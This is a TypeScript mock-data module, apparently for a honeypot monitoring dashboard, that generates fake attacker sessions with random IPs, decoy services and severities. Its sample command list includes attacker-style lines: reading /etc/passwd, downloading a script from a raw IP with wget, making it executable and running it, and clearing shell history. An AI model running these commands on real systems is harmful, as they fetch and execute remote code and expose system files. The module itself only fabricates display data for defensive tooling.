import type { HoneypotSession, Severity } from "@/types";
import { generateIP, id, minutesAgo, pick, randomBetween } from "./utils";

const SERVICES = ["ssh-decoy", "smb-share", "http-admin", "mysql-trap", "rdp-lure"];

const COMMANDS = [
  "uname -a",
  "cat /etc/passwd",
  "wget http://185.220.101.4/x.sh",
  "chmod +x x.sh",
  "./x.sh",
  "crontab -l",
  "netstat -tulpn",
  "curl -s ifconfig.me",
  "history -c",
  "ps aux | grep ssh",
];

const SEVERITIES: Severity[] = ["low", "medium", "high", "critical"];

export const getSessions = (count = 10): HoneypotSession[] =>
  Array.from({ length: count }, () => ({
    id: id("HP"),
    attackerIp: generateIP(),
    service: pick(SERVICES),
    startedAt: minutesAgo(randomBetween(1, 600)),
    durationSec: randomBetween(12, 2400),
    commands: Array.from({ length: randomBetween(2, 7) }, () => pick(COMMANDS)),
    severity: pick(SEVERITIES),
    payloadsCaptured: randomBetween(0, 6),
  })).sort((a, b) => b.startedAt.localeCompare(a.startedAt));
